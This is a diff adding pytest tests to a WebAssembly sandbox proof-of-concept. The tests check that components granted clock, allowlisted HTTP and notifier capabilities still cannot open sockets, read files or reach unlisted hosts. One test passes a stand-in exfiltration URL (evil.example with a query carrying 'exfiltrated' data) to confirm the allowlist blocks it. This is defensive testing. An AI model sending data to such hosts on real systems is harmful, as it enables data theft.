@@ -49,9 +49,13 @@ from pathlib import Path
 import pytest
 
 from poc.graph import load_graph_dict
+from poc.handles import CapabilityError, Clock, HTTPClient, Notifier, WallTime
 from poc.sandbox import (
+    CLOCK,
+    HTTP_CLIENT,
     INFERENCE_LLM,
     KB_READ,
+    NOTIFIER,
     RESPONSE_CHANNEL,
     TOOL_LLM,
     TYPES,
@@ -66,6 +70,7 @@ from poc.sandbox import (
     wasi_imports,
     wasm_path,
 )
+from poc.sandbox.nodes import heartbeat_sandbox
 
 _ARTIFACTS = [
     "node_parse_message",
@@ -73,8 +78,10 @@ _ARTIFACTS = [
     "node_fetch_context",
     "node_generate_response",
     "node_send_reply",
+    "node_heartbeat",
     "hostile_ambient",
     "hostile_ungranted",
+    "hostile_clocked",
 ]
 _missing = [m for m in _ARTIFACTS if not wasm_path(m).exists()]
 
@@ -313,6 +320,151 @@ def test_ungranted_capability_is_stronger_than_the_host_tier():
     — and granting it nothing does not let it instantiate either."""
     with pytest.raises(SandboxError):
         Sandbox("hostile_ungranted", {})
+
+
+# ── The I/O capability kinds: clock, outbound HTTP, notification ───
+#
+# Three kinds added ahead of the feed-triage service, and the clock is the sharp
+# one: every earlier component demonstrates the *absence* of `wasi:clocks` among
+# its imports, and these demonstrate the same derivation machinery granting it —
+# the upstream WASI interface as a capability like any other, satisfied by the
+# host's own handle rather than any WASI runtime context.
+
+
+def _fixed_clock(seconds: int = 1_700_000_000) -> Clock:
+    return Clock(_source=lambda: WallTime(seconds=seconds, nanoseconds=0))
+
+
+def _clocked_sandbox(clock: Clock) -> Sandbox:
+    def now():
+        t = clock.now()
+        return record(seconds=t.seconds, nanoseconds=t.nanoseconds)
+
+    return Sandbox("hostile_clocked", {CLOCK: {"now": now}})
+
+
+def test_clock_holder_imports_exactly_the_granted_wasi_interface():
+    """Scenario: a granted clock appears in the import set. The clock-holding
+    component imports exactly `wasi:clocks/wall-clock` — and `wasi_imports`, which
+    counts *ungranted* wasi imports, still reports it clean: the boundary between
+    capability and ambient authority is the `with` clause, not the namespace."""
+    assert capability_imports("hostile_clocked") == [CLOCK]
+    assert wasi_imports("hostile_clocked") == []
+
+
+def test_nodes_without_a_clock_import_no_clock_interface():
+    """Scenario: a node that does not declare a clock imports no clock interface.
+    Every previously built component still carries no `wasi:clocks` import — the
+    grant is per-node, not tier-wide."""
+    for component in _ARTIFACTS:
+        if component in ("hostile_clocked", "node_heartbeat"):
+            continue
+        assert CLOCK not in component_imports(component), component
+
+
+def test_the_granted_clock_is_live():
+    """The grant buys real authority, not a decorative import: the component's
+    `read-clock` export returns the time the host's handle supplied."""
+    sb = _clocked_sandbox(_fixed_clock(seconds=1_234_567))
+    assert sb.call("read-clock") == 1_234_567
+
+
+def test_clock_holder_cannot_open_a_socket():
+    """Scenario (hostile): a node granted a clock — one deliberately-granted WASI
+    interface — still cannot open a socket. Linking a typed interface is not
+    linking a WASI adapter; the ambient world stays closed."""
+    verdict = _clocked_sandbox(_fixed_clock()).call("escape-net")
+    assert not verdict.escaped, verdict.detail
+
+
+def test_clock_holder_cannot_read_the_filesystem():
+    """Scenario (hostile): the clock grant does not reopen the filesystem — there
+    is still no import for it to travel through."""
+    verdict = _clocked_sandbox(_fixed_clock()).call("escape-fs")
+    assert not verdict.escaped, verdict.detail
+
+
+_ALLOWLIST = frozenset({"feeds.example.com"})
+_FEED_URL = "https://feeds.example.com/a.xml"
+
+
+def _heartbeat_handles(responses: dict[str, str] | None = None):
+    http = HTTPClient(
+        allowlist=_ALLOWLIST,
+        _responses=responses if responses is not None else {_FEED_URL: "<rss>hello</rss>"},
+    )
+    return _fixed_clock(), http, Notifier(channel="digest")
+
+
+def test_heartbeat_imports_exactly_its_three_interfaces():
+    """The I/O demonstrator holds `Clock`, `HTTPClient<[...]>`, and
+    `Notifier<'...'>` — its component imports exactly the three backing
+    interfaces, no filesystem, no ambient socket, no LLM."""
+    assert capability_imports("node_heartbeat") == sorted([CLOCK, HTTP_CLIENT, NOTIFIER])
+    assert wasi_imports("node_heartbeat") == []
+
+
+def test_new_kinds_derive_from_a_with_clause_with_no_special_case():
+    """Scenario: the derived and actual import sets agree for the new kinds.
+
+    The graph below does not ship as a canonical graph — the feed-triage service
+    it sketches is proposed separately — but the derivation is the same code path
+    the customer-support test uses: `expected_imports` parses the `with` clause
+    with the project's type parser and maps each capability to its interface.
+    That the three new kinds needed no change to that mechanism (each is one
+    mapping entry) is the point being pinned."""
+    graph = {
+        "name": "FeedPulse",
+        "parameters": [
+            "FeedRef",
+            "Clock",
+            "HTTPClient<['feeds.example.com']>",
+            "Notifier<'digest'>",
+        ],
+        "capabilities": [
+            "Clock",
+            "HTTPClient<['feeds.example.com']>",
+            "Notifier<'digest'>",
+        ],
+        "nodes": [
+            {
+                "name": "Heartbeat",
+                "inputs": [
+                    "FeedRef",
+                    "Clock",
+                    "HTTPClient<['feeds.example.com']>",
+                    "Notifier<'digest'>",
+                ],
+                "output": "HeartbeatReport",
+            }
+        ],
+        "data_edges": [],
+    }
+    assert component_imports("node_heartbeat") == expected_imports(graph, "Heartbeat")
+
+
+def test_heartbeat_runs_within_its_allowlist():
+    """The benign path: one clock read, one permitted fetch, one notification —
+    each crossing landing on the handle the host bound, with the typed report
+    carrying the evidence back."""
+    clock, http, notifier = _heartbeat_handles()
+    out = heartbeat_sandbox(_FEED_URL, clock, http, notifier)
+    assert out.seconds == 1_700_000_000
+    assert out.fetched == len("<rss>hello</rss>")
+    assert out.notified is True
+    assert notifier.sent and "fetched" in notifier.sent[0]
+
+
+def test_http_holder_cannot_leave_its_allowlist():
+    """Scenario (hostile): a node granted an allowlisted HTTP capability asks for
+    a host outside the list — the exfiltration URL of the feed-triage threat
+    model — and the crossing refuses it. The component holds the *operation*; the
+    allowlist lives in the handle, exactly as a tool-LLM's tool scope does, so
+    the refusal is the handle's and no wiring reaches around it."""
+    clock, http, notifier = _heartbeat_handles()
+    with pytest.raises(CapabilityError, match=r"evil\.example"):
+        heartbeat_sandbox("https://evil.example/?d=exfiltrated", clock, http, notifier)
+    assert notifier.sent == []  # refused before anything was notified
 
 
 # ── The boundary is typed ──────────────────────────────────────────
